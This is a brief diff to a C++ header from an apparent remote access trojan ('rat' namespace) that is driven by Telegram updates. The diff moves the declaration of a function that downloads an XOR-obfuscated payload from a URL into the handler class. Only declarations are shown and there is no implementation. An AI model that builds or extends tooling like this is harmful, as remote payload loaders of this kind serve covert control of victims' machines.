@@ -176,13 +176,10 @@ class Handler {
 	// Handle Telegram update
 
 	void handleUpdates();
+	::rat::networking::NetworkingResult
+	downloadXoredPayload(const std::string &File_Url);
 
 }; // class rat::handler::Handler
-
-::rat::networking::NetworkingResult
-downloadXoredPayload(::rat::networking::Client *p_Curl_Client,
-                     std::vector<uint8_t> &Payload_Buffer,
-                     const std::string &File_Url, std::string *p_Xor_Key);
 
 void __normalizeWhiteSpaces(std::string &String_Input);
 
